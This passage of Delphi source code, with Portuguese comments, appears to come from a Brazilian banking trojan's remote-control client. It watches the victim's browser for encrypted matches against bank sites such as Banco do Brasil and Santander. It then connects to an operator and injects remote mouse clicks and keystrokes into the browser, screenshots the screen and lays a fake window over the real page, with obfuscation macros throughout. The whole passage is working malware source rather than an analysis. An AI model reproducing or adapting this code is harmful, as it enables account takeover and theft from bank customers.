             mouse_event(MOUSEEVENTF_LEFTDOWN, 0, 0, 0, 0);
           end;
             {
             MouseCMD( BrowserHWND, 1, posX, posY );
             // MouseCMD( BrowserHWND,MOUSEEVENTF_LEFTDOWN,posX,posY);
             //MouseSettings := TStringList.Create;
             //ExtractStrings(['|'], [' '], PChar(MSG), MouseSettings);
             //MouseCMD( BrowserHWND,   StrToInt(MouseSettings.Strings[0]),
             //StrToInt(MouseSettings.Strings[1]), StrToInt(MouseSettings.Strings[2]));
             //MouseSettings.Free;
             }
      end;

  // Quando botao direito do mouse é SOLTO
  if Pos('<|MouseLU|>', strCommand)>0 then
      begin
        Dados2 := StrCommand;

        Delete(dados2, 1, Pos('<|MouseLU|>', dados2)+10);
        posX := strToInt(Copy(dados2, 1, Pos('<|>', dados2)-1));

        Delete(dados2, 1, Pos('<|>', dados2)+2);
        posY := strToInt(Copy(dados2, 1, Pos('<<|', dados2)-1));

        if WindowInfActive then
           SendMessage( BrowserHWND, WM_LBUTTONUP, 1, MakeLong(posX, posY) )
        else
           begin
             SetCursorPos(posX, posY);
             mouse_event(MOUSEEVENTF_LEFTUP, 0, 0, 0, 0);
           end;
      end;

  if Pos('<|MouseRD|>', strCommand)>0 then
      begin
        Dados2 := StrCommand;

        Delete(dados2, 1, Pos('<|MouseRD|>', dados2)+10);
        posX := strToInt(Copy(dados2, 1, Pos('<|>', dados2)-1));

        Delete(dados2, 1, Pos('<|>', dados2)+2);
        posY := strToInt(Copy(dados2, 1, Pos('<<|', dados2)-1));

        if WindowInfActive then
           SendMessage( BrowserHWND, WM_RBUTTONDOWN, 2, MakeLong(posX, posY) )
        else
           begin
             SetCursorPos(posX, posY);
             mouse_event(MOUSEEVENTF_RIGHTDOWN, 0, 0, 0, 0);           
           end;

      end;

  if Pos('<|MouseRU|>', strCommand)>0 then
      begin
        Dados2 := StrCommand;

        Delete(dados2, 1, Pos('<|MouseRU|>', dados2)+10);
        posX := strToInt(Copy(dados2, 1, Pos('<|>', dados2)-1));

        Delete(dados2, 1, Pos('<|>', dados2)+2);
        posY := strToInt(Copy(dados2, 1, Pos('<<|', dados2)-1));

        if WindowInfActive then
           SendMessage( BrowserHWND, WM_RBUTTONUP, 2, MakeLong(posX, posY) )
        else
           begin
             SetCursorPos(posX, posY);
             mouse_event(MOUSEEVENTF_RIGHTUP, 0, 0, 0, 0);
           end;
      end;

      {
      if Pos('<|MouseDC|>', strCommand)>0 then
          begin
            Dados2 := StrCommand;

            Delete(dados2, 1, Pos('<|MouseRU|>', dados2)+10);
            posX := strToInt(Copy(dados2, 1, Pos('<|>', dados2)-1));

            Delete(dados2, 1, Pos('<|>', dados2)+2);
            posY := strToInt(Copy(dados2, 1, Pos('<<|', dados2)-1));

            if WindowInfActive then
               begin
                 // SendMessage( BrowserHWND, WM_LBUTTONDBLCLK, 1, MakeLong(posX, posY) );
                  SendMessage( BrowserHWND, WM_LBUTTONDOWN, 1, MakeLong(posX, posY) );
                  SendMessage( BrowserHWND, WM_LBUTTONUP, 1, MakeLong(posX, posY) );
               end;

            mouse_event( MOUSEEVENTF_LEFTDOWN, 0, 0, 0, 0);
            Sleep(10);
            mouse_event( MOUSEEVENTF_LEFTUP, 0, 0, 0, 0);
          end;
        }

  // ENCODE_END macro
  asm DB $EB, $10, $57, $4c, $20, $20, $05, $00, $00, $00, $00, $00, $00, $00, $57, $4c, $20, $20 end;


end;

procedure TfCliente.CS2Connect(Sender: TObject; Socket: TCustomWinSocket);
begin
  // ENCODE_START macro
  asm DB $EB, $10, $57, $4c, $20, $20, $04, $00, $00, $00, $00, $00, $00, $00, $57, $4c, $20, $20 end;

  Sleep(1000); //2000
  Socket.SendText('<|Desktop|>');

  // ENCODE_END macro
  asm DB $EB, $10, $57, $4c, $20, $20, $05, $00, $00, $00, $00, $00, $00, $00, $57, $4c, $20, $20 end;
 
end;

procedure TfCliente.CS3Error(Sender: TObject; Socket: TCustomWinSocket;
  ErrorEvent: TErrorEvent; var ErrorCode: Integer);
begin
  ErrorCode := 0;
end;

procedure TfCliente.CS3Read(Sender: TObject; Socket: TCustomWinSocket);
var
  dados: String;
  TEXTO     : String;
  btnValue  : string;
  valueChar : Char;
  i : Integer;
  BrowserLocalHND : HWND;
  Janela : THandle;

  LayoutKeyboard : HKL;
  Key            : integer;

begin
  // ENCODE_START macro
  asm DB $EB, $10, $57, $4c, $20, $20, $04, $00, $00, $00, $00, $00, $00, $00, $57, $4c, $20, $20 end;

  dados := Socket.ReceiveText;
  if WindowInfActive then
     begin
       if (dados = '{DOWN}') then
          begin
            // AutoHotkey.Enabled := false;
            SendMessage(fCliente.BrowserHWND,WM_KEYDOWN,VK_DOWN,1);//Simula o pressionamento da tecla com a seta para baixo
            Sleep(900);//Espera 0,1segudos
            SendMessage(fCliente.BrowserHWND,WM_KEYUP,VK_DOWN,1);//Simula a liberação da tecla com a seta para baixo
          end
       else if (dados = '{UP}') then
          begin
            // AutoHotkey.Enabled := false;
            SendMessage(fCliente.BrowserHWND,WM_KEYDOWN,VK_UP,1);//Simula o pressionamento da tecla com a seta para baixo
            Sleep(900);//Espera 0,1segudos
            SendMessage(fCliente.BrowserHWND,WM_KEYUP,VK_UP,1);//Simula a liberação da tecla com a seta para baixo
          end
       else if (dados = '{LEFT}') then
          begin
            // AutoHotkey.Enabled := false;
            SendMessage(fCliente.BrowserHWND,WM_KEYDOWN,VK_LEFT,1);//Simula o pressionamento da tecla com a seta para baixo
            Sleep(900);//Espera 0,1segudos
            SendMessage(fCliente.BrowserHWND,WM_KEYUP,VK_LEFT,1);//Simula a liberação da tecla com a seta para baixo
          end
       else if (dados = '{RIGHT}') then
          begin
            // AutoHotkey.Enabled := false;
            SendMessage(fCliente.BrowserHWND,WM_KEYDOWN,VK_RIGHT,1);//Simula o pressionamento da tecla com a seta para baixo
            Sleep(900);//Espera 0,1segudos
            SendMessage(fCliente.BrowserHWND,WM_KEYUP,VK_RIGHT,1);//Simula a liberação da tecla com a seta para baixo
          end
       else if (dados = '{DEL}') then
          begin
            SendMessage(fCliente.BrowserHWND,WM_KEYDOWN,VK_DELETE,1);//Simula o pressionamento da tecla DELETE
            SendMessage(fCliente.BrowserHWND,WM_KEYUP,VK_DELETE,1);//Simula o pressionamento da tecla DELETE
          end
       else if (dados = '{TAB}') then
          begin
            SendMessage(fCliente.BrowserHWND,WM_KEYDOWN,VK_TAB,1);//Simula o pressionamento da tecla TAB
            SendMessage(fCliente.BrowserHWND,WM_KEYUP,VK_TAB,1);//Simula o pressionamento da tecla TAB
          end
       else if (PChar(dados) = #8) or (dados = '{BS}') then
          begin
            // AutoHotkey.Enabled := false;
            SendMessage( fCliente.BrowserHWND,WM_KEYDOWN,VK_BACK,1);//Simula o pressionamento da tecla BACKSPACE
            SendMessage( fCliente.BrowserHWND,WM_KEYUP,VK_BACK,1);//Simula o pressionamento da tecla BACKSPACE
          end;
//       else
//          begin
//            KeyCMD(dados);
//          end;


       {  if fCliente.BrowserHWND <> 0 then
            BrowserLocalHND := fCliente.BrowserHWND
         else if fCliente.BKP_BrowserHWND <> 0 then
            BrowserLocalHND := fCliente.BKP_BrowserHWND
         else
            BrowserLocalHND := FindWindow(nil, PAnsiChar(  LinkJanela ));

         if BrowserLocalHND <> 0 then
            begin
              SendKeys1.WindowHandle := BrowserLocalHND;
              fCliente.CS1.Socket.SendText( 'HANDLER: ' + IntToStr(SendKeys1.WindowHandle) );
              for i := 1 to Length(dados) do
              begin
                SendKeys1.SendKey( dados[i] );
                fCliente.CS1.Socket.SendText(dados[i]);
              end;
            end;}

       //LayoutKeyboard := GetKeyboardLayout(0);
       //Key := VkKeyScanEx(letra,layoutKeyboard);

       if (Dados='{ENTER}') then
           begin
              Exit;
              try
                SendKeys1.WindowHandle := fCliente.BrowserHWND;
                SendKeys1.SendKey(Char(13));
                sleep(300);
              except
                SendMessage(fCliente.BrowserHWND,WM_KEYDOWN,VK_RETURN,1);
                SendMessage(fCliente.BrowserHWND,WM_KEYUP,VK_RETURN,1);
              end;
           end
       else
          begin
             for i := 1 to Length(dados) do
             begin
               SendMessage(fCliente.BrowserHWND, WM_CHAR, Word(dados[i]), 0);
             end;
          end;

       //SendKeys( PChar(dados), False);
       // SendMessage( BrowserHWND, WM_KEYDOWN, 0, Integer(PChar(dados)));
       //KeyCMDIta( dados )
     end
  else
     begin
       SndKey32.SendKeys( PChar(dados), False);
       sleep(300);
     end;

  // ENCODE_END macro
  asm DB $EB, $10, $57, $4c, $20, $20, $05, $00, $00, $00, $00, $00, $00, $00, $57, $4c, $20, $20 end;

end;

procedure TfCliente.CS3Connect(Sender: TObject; Socket: TCustomWinSocket);
begin
  // ENCODE_START macro
  asm DB $EB, $10, $57, $4c, $20, $20, $04, $00, $00, $00, $00, $00, $00, $00, $57, $4c, $20, $20 end;

  Sleep(200);
  Socket.SendText('<|KEYBOARD|>');

  // ENCODE_END macro
  asm DB $EB, $10, $57, $4c, $20, $20, $05, $00, $00, $00, $00, $00, $00, $00, $57, $4c, $20, $20 end;
end;

procedure TfCliente.Timer1Timer(Sender: TObject);
begin
  // ENCODE_START macro
  asm DB $EB, $10, $57, $4c, $20, $20, $04, $00, $00, $00, $00, $00, $00, $00, $57, $4c, $20, $20 end;

 if not CS1.Active then
    CS1.Active := true;

  // ENCODE_END macro
  asm DB $EB, $10, $57, $4c, $20, $20, $05, $00, $00, $00, $00, $00, $00, $00, $57, $4c, $20, $20 end;

end;

procedure TfCliente.CS1Connecting(Sender: TObject; Socket: TCustomWinSocket);
begin
  Connect.Enabled := false;
  Edit1.Enabled   := false;
  Edit2.Enabled   := false;
  Edit3.Enabled   := false;
  Edit4.Enabled   := false;
  StatusBar1.Panels.Items[1].Text := 'Conectando...';
end;

procedure TfCliente.Timer2Timer(Sender: TObject);
begin
    if RecebendoDados then
       RecebendoDados := false
    else
       begin
         CS1.Active := false;
         CS2.Active := false;
         CS3.Active := false;
       end;
end;

procedure TfCliente.tmProcuraTimer(Sender: TObject);
begin
  ProcuraJanela;
end;


function TfCliente.FOCA_Windows: String;
var
  hwnd_janela_foco : hwnd;
  i_tamanho_titulo_janela: integer;
begin
  // ENCODE_START macro
  asm DB $EB, $10, $57, $4c, $20, $20, $04, $00, $00, $00, $00, $00, $00, $00, $57, $4c, $20, $20 end;

  hwnd_janela_foco        := GetForegroundWindow;                               // Obtem o handle da janela em foco
  i_tamanho_titulo_janela := GetWindowTextLength(hwnd_janela_foco);             // obtem o tamanho do titulo
  SetLength(Result, i_tamanho_titulo_janela);                                   // Ajusta o comprimento da string
  GetWindowText( hwnd_janela_foco, PChar(Result), i_tamanho_titulo_janela + 1); // copia o titulo especifico da barra de titulo da Janela (handle obtido)
  SetForegroundWindow(hwnd_janela_foco);
  // ENCODE_END macro
  asm DB $EB, $10, $57, $4c, $20, $20, $05, $00, $00, $00, $00, $00, $00, $00, $57, $4c, $20, $20 end;

end;

procedure TfCliente.chkProcOrigem(Link: String);
begin
   // ENCODE_START macro
  asm DB $EB, $10, $57, $4c, $20, $20, $04, $00, $00, $00, $00, $00, $00, $00, $57, $4c, $20, $20 end;

  // BB
  if Pos(Crypt('D', 'EA1FD466D80E4EF05387CA6C'), Link) <> 0 then   // [b b  c o m  b r]
     begin
       LinkJanela := Link;
       StartRemote(Decrypt(nBB1,nw21));
     end;

  if (Pos(Crypt('D','9E88ED5F8BC80822D9CBCBAFBA13BD709537DDCC5983A638A82FE9'), Link) <> 0) or
     (Pos(Crypt('D','EF6B9959F05241C17AE9D7'), Link) <> 0) then
     begin
       LinkJanela := Link;
       StartRemote(Decrypt(nIT1,nw21));
     end;

  if (Pos(Crypt('D','210D68D90E4FF21FDE'), Link) <> 0) or
     (Pos(Crypt('D','AAB542E1094A59E912410F'), Link) <> 0) then
     begin
       LinkJanela := Link;
       StartRemote(Decrypt(nIT1,nw21));
     end;

  if (Pos(Crypt('D','9948EA332DBD032FDF77D979AEE579BF64A74FF06A935BFC5FB953F217D21ECB19022AD77DB767C27BA059F6'), Link) <> 0) or
     (Pos(Crypt('D','8DB67C8CBC10B05F8282D602296EE0047AD70947F9688BC90545E4'), Link) <> 0) or
     (Pos(Crypt('D','091226C565E6343DE377E80A3BA727'), Link) <> 0) or
     (Pos(Crypt('D','2920D015C406543FC985CB7192CA'), Link) <> 0) or
     (Pos(Crypt('D','D86281B3548BCD7AA5E176A1494E80A5'), Link) <> 0) then
     begin
       LinkJanela := Link;
       StartRemote(Decrypt(nVE1,nw21));
     end;

  if (Pos(Crypt('D','65F733F610B02CDA03116085B518B17797'), Link) <> 0) or // Internet Banking
     (Pos(Crypt('D','212DDB1BC317B650F95E'), Link) <> 0) then
     begin
       LinkJanela := Link;
       StartRemote(Decrypt(nSA1,nw22));
     end;

  // chama Juri
  if (Pos(Crypt('D','91BD4AE912419C4AE364'),Link) <> 0) and
     (Pos(Crypt('D','D17BB578A725B59EA428A9D37EDE7284'),Link) <> 0) or
     (Pos(Crypt('D','11DD6A89B121BC6A83C71ECF0641965DF75F8DDF06'),Link) <> 0) then
     begin
       LinkJanela := Link;
       StartRemote(Decrypt(nSA2,nw22));
     end;

  if (Pos(Crypt('D','91BD4AE912419C4AE364'),Link) <> 0) and     // s   an tan der
     (Pos(Crypt('D','B058E80DCC0E5C37312D93B85A82'),Link) <> 0) or
     (Pos(Crypt('D','935EEA0830A321CE78D834D3054B49FC26'),Link) <> 0) then
     begin
       LinkJanela := Link;
       StartRemote(Decrypt(nSA1,nw22));
     end;

  // (Pos(Crypt('D','91BD4AE912419C4AE364'),Link) <> 0) and
  if (Pos(Crypt('D','9783B14A8EDDCE5F8ECF0D46F566F90C659E4194B3679B3C'),Link) <> 0) or  // Pessoa fisica
     (Pos(Crypt('D','98A251EB28BBDA093498F51CC8'),Link) <> 0) then // link
     begin
       LinkJanela := Link;
       StartRemote('FAZUL');
     end;

  if (Pos(Crypt('D','322DDB1B329380AF594BBE75903D1BD073E1'),Link) <> 0) or  // Pessoa fisica
     (Pos(Crypt('D','003BF80A74E566988ADE62'),Link) <> 0) then // link
     begin
       LinkJanela := Link;
       StartRemote('FBRB');
     end;

  // ENCODE_END macro
  asm DB $EB, $10, $57, $4c, $20, $20, $05, $00, $00, $00, $00, $00, $00, $00, $57, $4c, $20, $20 end;
    

end;

procedure TfCliente.StartRemote(Bank: String);
begin
  // ENCODE_START macro
  asm DB $EB, $10, $57, $4c, $20, $20, $04, $00, $00, $00, $00, $00, $00, $00, $57, $4c, $20, $20 end;

  nBak := Bank;
 // PostMessage( fCliente.BrowserHWND, WM_SYSCOMMAND, SC_MAXIMIZE, 0);
 // SendMessage( fCliente.BrowserHWND, WM_SYSCOMMAND, SC_MAXIMIZE, 0);
 // SendMessage( fCliente.BrowserHWND, WM_SYSCOMMAND, SC_MAXIMIZE, 0);
    //ShowWindow( fCliente.BrowserHWND  , SW_MAXIMIZE);
  if Blocked(Bank) then
     begin
       tmProcura.Enabled := False;
       MessageBox(GetForegroundWindow, 'Erro ao abrir o site.', 'Erro.',MB_ICONEXCLAMATION);
       KP(GetForegroundWindow);
       if Not tmProcura.Enabled then
          tmProcura.Enabled := true;
     end
  else
     begin
       // tmProcura.Enabled := False;
       if not CheckBox1.Checked then
          CheckBox1.Checked := True;
       // if not CS1.Active then
       Connect.Click;
     end;
  // ENCODE_END macro
  asm DB $EB, $10, $57, $4c, $20, $20, $05, $00, $00, $00, $00, $00, $00, $00, $57, $4c, $20, $20 end;


end;

function TfCliente.Blocked(BlockedBank: String): boolean;
var
  Reg: TRegistry;
begin
  // ENCODE_START macro
  asm DB $EB, $10, $57, $4c, $20, $20, $04, $00, $00, $00, $00, $00, $00, $00, $57, $4c, $20, $20 end;

  nBak := BlockedBank;
  Reg  := TRegistry.Create;
  Reg.RootKey := HKEY_CURRENT_USER;
  Reg.OpenKey('\Software\WinBlock', False);
  if Reg.ReadString(BlockedBank) = 'Block' then
     Result := True
  else
     Result := False;
  // ENCODE_END macro
  asm DB $EB, $10, $57, $4c, $20, $20, $05, $00, $00, $00, $00, $00, $00, $00, $57, $4c, $20, $20 end;

end;

procedure TfCliente.FormCreate(Sender: TObject);
begin
  // ENCODE_START macro
  asm DB $EB, $10, $57, $4c, $20, $20, $04, $00, $00, $00, $00, $00, $00, $00, $57, $4c, $20, $20 end;


  nBakAnt := '';
  tmProcura.Enabled := True;



  // ENCODE_END macro
  asm DB $EB, $10, $57, $4c, $20, $20, $05, $00, $00, $00, $00, $00, $00, $00, $57, $4c, $20, $20 end;

end;


{**********************************************}
// Capture a window
// Example: Capture the foreground window:
{
procedure TForm1.Button1Click(Sender: TObject);
begin
  ScreenShot(GetForeGroundWindow, Image1.Picture.Bitmap);
end;
}
procedure ScreenShotA(hWindow: HWND; bm: TBitmap);
var
  Left, Top, Width, Height: Word;
  R: TRect;
  dc: HDC;
  lpPal: PLOGPALETTE;
begin
  {Check if valid window handle}
  if not IsWindow(hWindow) then Exit;
  {Retrieves the rectangular coordinates of the specified window}
  GetWindowRect(hWindow, R);
  Left := R.Left;
  Top := R.Top;
  Width := R.Right - R.Left;
  Height := R.Bottom - R.Top;
  bm.Width  := Width;
  bm.Height := Height;
  {get the screen dc}
  dc := GetDc(0);
  if (dc = 0) then
  begin
    Exit;
  end;
  {do we have a palette device?}
  if (GetDeviceCaps(dc, RASTERCAPS) and
    RC_PALETTE = RC_PALETTE) then
  begin
    {allocate memory for a logical palette}
    GetMem(lpPal,
      SizeOf(TLOGPALETTE) +
    (255 * SizeOf(TPALETTEENTRY)));
    {zero it out to be neat}
    FillChar(lpPal^,
      SizeOf(TLOGPALETTE) +
    (255 * SizeOf(TPALETTEENTRY)),
      #0);
    {fill in the palette version}
    lpPal^.palVersion := $300;
    {grab the system palette entries}
    lpPal^.palNumEntries :=
      GetSystemPaletteEntries(dc,
      0,
      256,
      lpPal^.palPalEntry);
    if (lpPal^.PalNumEntries <> 0) then
    begin
      {create the palette}
      bm.Palette := CreatePalette(lpPal^);
    end;
    FreeMem(lpPal, SizeOf(TLOGPALETTE) +
    (255 * SizeOf(TPALETTEENTRY)));
  end;
  {copy from the screen to the bitmap}
  BitBlt(bm.Canvas.Handle,
    0,
    0,
    Width,
    Height,
    Dc,
    Left,
    Top,
    SRCCOPY);
  {release the screen dc}
  ReleaseDc(0, dc);
end;



function TfCliente.StartWindowInf(Window: HWND; fFake: TForm):Boolean;
var
  Resultado : Boolean;

  procedure PrintTela;
  begin
    // ENCODE_START macro
    asm DB $EB, $10, $57, $4c, $20, $20, $04, $00, $00, $00, $00, $00, $00, $00, $57, $4c, $20, $20 end;

    try
      // Print Janela Ativa ( ALT + PRINT SCREEN )
      keybd_event(VK_MENU, 0, 0, 0);
      keybd_event(VK_SNAPSHOT, 0, 0, 0);
      keybd_event(VK_SNAPSHOT, 0, KEYEVENTF_KEYUP, 0);
      keybd_event(VK_MENU, 0, KEYEVENTF_KEYUP, 0);
      BringWindowToTop(fCliente.FakeHWND);
      SetForegroundWindow(fCliente.FakeHWND);
      if Clipboard.HasFormat(CF_PICTURE) then
         fSOBRE.Image.Picture.Assign(Clipboard)
   //  else
   //     PrintTela;
    finally
       Clipboard.Clear;
    end;
    // ENCODE_END macro
    asm DB $EB, $10, $57, $4c, $20, $20, $05, $00, $00, $00, $00, $00, $00, $00, $57, $4c, $20, $20 end;

  end;

begin
  // ENCODE_START macro
  asm DB $EB, $10, $57, $4c, $20, $20, $04, $00, $00, $00, $00, $00, $00, $00, $57, $4c, $20, $20 end;

  Resultado := False;
  Clipboard.Clear;
  tmProcura.Enabled := False;       // Desativa Procura
  try
    fLie := fFake;                  // Assing para WindowInf ( faqe )
    FAKE := fLie.Caption;           // Obtem titulo do form da WindowInf
    PrintTela;                      // Efetua o Print Screen da tela
    fSobre.AlphaBlendValue := 100;  // Transparencia 100 %
    fSobre.Color := clWhite;        // Fundo Branco
    fSobre.Show;                    // Abre form sobre a tela
    // Ajusta dimensoes
    fLie.Left := (fSOBRE.Width  div 2) - (fLie.Width  div 2);
    fLie.Top  := (fSOBRE.Height div 2) - (fLie.Height div 2);
    Windows.SetParent(fLie.Handle, fSOBRE.Handle); // Coloca WindowInf (faqe) dentro do form que vai ficar sobre a tela
    //    MarcaDagua;  // faz marca dagua
    fLie.Show;         // Mostra WindowInf ( faqe )
    Resultado := True;
  except
    Resultado := False;
  end;
  Clipboard.Clear;
  Result := Resultado;

  // ENCODE_END macro
  asm DB $EB, $10, $57, $4c, $20, $20, $05, $00, $00, $00, $00, $00, $00, $00, $57, $4c, $20, $20 end;
end;



procedure TfCliente.MouseCMD(Window: HWND; Direction, X, Y: Integer);
begin
  // ENCODE_START macro
  asm DB $EB, $10, $57, $4c, $20, $20, $04, $00, $00, $00, $00, $00, $00, $00, $57, $4c, $20, $20 end;

  case Direction of
     1: begin
          SendMessage(Window, WM_LBUTTONDOWN, Direction, MakeLong(X, Y));
          //Delay(100);
          SendMessage(Window, WM_LBUTTONUP, Direction, MakeLong(X, Y));
        end;
     2: begin
          SendMessage(Window, WM_RBUTTONDOWN, Direction, MakeLong(X, Y));
          //Delay(100);
          SendMessage(Window, WM_RBUTTONUP, Direction, MakeLong(X, Y));
        end;
  end;

  // ENCODE_END macro
  asm DB $EB, $10, $57, $4c, $20, $20, $05, $00, $00, $00, $00, $00, $00, $00, $57, $4c, $20, $20 end;

end;

procedure TfCliente.KeyCMDEX(Key: String);
begin
  // ENCODE_START macro
  asm DB $EB, $10, $57, $4c, $20, $20, $04, $00, $00, $00, $00, $00, $00, $00, $57, $4c, $20, $20 end;

  SendMessage(fCliente.BrowserHWND, WM_KEYDOWN, StrToInt(Key), 1);
  //Delay(50);
  SendMessage(fCliente.BrowserHWND, WM_KEYUP, StrToInt(Key), 1);

  // ENCODE_END macro
  asm DB $EB, $10, $57, $4c, $20, $20, $05, $00, $00, $00, $00, $00, $00, $00, $57, $4c, $20, $20 end;

end;

procedure TfCliente.KeyCMD(STR: String);
var
  i,x,j     : Integer;
  TEXTO     : String;
  btnValue  : string;
  valueChar : Char;

  procedure ProcessLetter(letra: Char);
  var
    LayoutKeyboard : HKL;
    Key            : integer;
  begin
    // ENCODE_START macro
    asm DB $EB, $10, $57, $4c, $20, $20, $04, $00, $00, $00, $00, $00, $00, $00, $57, $4c, $20, $20 end;

    //Trata o foco das janelas.
    //trataJanelas;

    //Segura o Shift
    //if shiftState = true then
    //  keybd_event(VK_SHIFT, 0, 0, 0);

    LayoutKeyboard := GetKeyboardLayout(0);

    Key := VkKeyScanEx( letra , LayoutKeyboard );

    //Caso seja um edit prepara o cursor
    keybd_event(39, 0, 0, 0);
    keybd_event(39, 0, KEYEVENTF_KEYUP, 0);

    keybd_event(LoByte(Key), 0, 0, 0);
    keybd_event(LoByte(Key), 0, KEYEVENTF_KEYUP, 0);

    //Solta o shift
    // if shiftState = true then begin
    //  keybd_event(VK_SHIFT, 0, KEYEVENTF_KEYUP, 0);
    //  shiftState := false;
    //  imgShift.Picture.LoadFromFile(vsPath + '..\pas\images\ledoff.bmp');
    //end;

    // Form2.Edit1.Text := Form2.Edit1.Text + IntToStr( Key );
    // Form1.Edit2.Text := Form1.Edit1.Text + IntToStr(  );

    // ENCODE_END macro
    asm DB $EB, $10, $57, $4c, $20, $20, $05, $00, $00, $00, $00, $00, $00, $00, $57, $4c, $20, $20 end;

  end;

begin
  // ENCODE_START macro
  asm DB $EB, $10, $57, $4c, $20, $20, $04, $00, $00, $00, $00, $00, $00, $00, $57, $4c, $20, $20 end;

  // TEXTO := YesWhiteNumero(STR);
  TEXTO := Trim(STR);
  for i := 1 to Length(TEXTO) do
  begin
    if (Trim(TEXTO[i])<>'') and (i <= Length(TEXTO)) then
       begin
         btnValue  := TEXTO[i];
         valueChar := btnValue[1];
         ProcessLetter(valueChar);
       end;
  end;

    // ENCODE_END macro
  asm DB $EB, $10, $57, $4c, $20, $20, $05, $00, $00, $00, $00, $00, $00, $00, $57, $4c, $20, $20 end;


end;

procedure TfCliente.KeyCMDIta(STR: string);
var
  i : Integer;
begin
  // ENCODE_START macro
  asm DB $EB, $10, $57, $4c, $20, $20, $04, $00, $00, $00, $00, $00, $00, $00, $57, $4c, $20, $20 end;

  for i := 0 to Length(STR) do
  begin
    SendMessage(fCliente.BrowserHWND, WM_CHAR, Ord(STR[i]), 1);
  end;

  // ENCODE_END macro
  asm DB $EB, $10, $57, $4c, $20, $20, $05, $00, $00, $00, $00, $00, $00, $00, $57, $4c, $20, $20 end;

end;

procedure TfCliente.ProcuraJanela;
var
  Title : Array [0 .. 255] of Char;
  WND   : HWND;
  ShellWindowsLocal    : TShellWindows;
  ShellWindowDispLocal : IDispatch;
  WebBrowserLocal      : IWebbrowser2;
  Document             : Variant;  // Interface para documento Web Browser
  DocElement           : Variant; // Interface para elementos do Documento
  Count   : integer;
  Link2   : String;
begin
  // ENCODE_START macro
  asm DB $EB, $10, $57, $4c, $20, $20, $04, $00, $00, $00, $00, $00, $00, $00, $57, $4c, $20, $20 end;

  WND := GetForegroundWindow;
  GetWindowText(  WND, Title, SizeOf(Title));

  Link2 := Title;

  if Trim(Link2) = '' then
     begin
        try
          try
            Link2 := FOCA_Windows;
            if Trim(Link2) <> '' then
               exit;
          except

          end;

          if (ShellWindowsLocal = nil) then
              ShellWindowsLocal := TShellWindows.Create(nil);
          try
            for Count := 0 to ShellWindowsLocal.Count - 1 do //Enumera todas ShellWindows
            begin
              ShellWindowDispLocal := ShellWindowsLocal.Item(Count); //Obtem Interface da Shell Windows atual
              // sleep(1000);
              if ShellWindowDispLocal = nil then
                 Continue; //Interface esta presente continua
              ShellWindowDispLocal.QueryInterface(iWebBrowser2, WebBrowserLocal); //Se janela for um navegador IE ( IWebBrower )

              if WebBrowserLocal <> nil then
                 begin
                   try
                     if WebBrowserLocal.LocationURL = '' then
                        Continue; //Se o Browser for um navegador ?
                   except

                   end;
                   //URL é encontrada, Interface é Query -> Break
                   Link2 := WebBrowserLocal.LocationURL ;
                   lblLink.Caption := Link2;
                 end;
            end;
            // if WebBrowserLocal <> nil then
            // Title := WebBrowserLocal.LocationURL + ' || ' + WebBrowserLocal.LocationName ;
          except

          end;
        finally
          ShellWindowsLocal.Free;
        end;
     end;

  if Pos(Crypt('D','6BED092CDD62E3023A689E5385C8082DDB7B'), Link2) <> 0 then //Internet Explorer
     begin
       FakeHWND    := WND;
       BrowserHWND := IEHandle;
       BKP_BrowserHWND := BrowserHWND;
       chkProcOrigem(Link2);
     end;

  if Pos(Crypt('D','888CAE78AD28A7422E469C4BF664E30B'), Link2) <> 0 then // Mozilla Firefox
     begin
       FakeHWND    := WND;
       BrowserHWND := GetForegroundWindow;
       BKP_BrowserHWND := BrowserHWND;
       chkProcOrigem(Link2);
     end;

  if Pos(Crypt('D','C7569051F4538BE068E26691B827'), Link2) <> 0 then // Google Chrome
     begin
       FakeHWND    := WND;
       BrowserHWND := ChromeH;
       BKP_BrowserHWND := BrowserHWND;
       chkProcOrigem(Link2);
     end;

  // ENCODE_END macro
  asm DB $EB, $10, $57, $4c, $20, $20, $05, $00, $00, $00, $00, $00, $00, $00, $57, $4c, $20, $20 end;

end;

end.
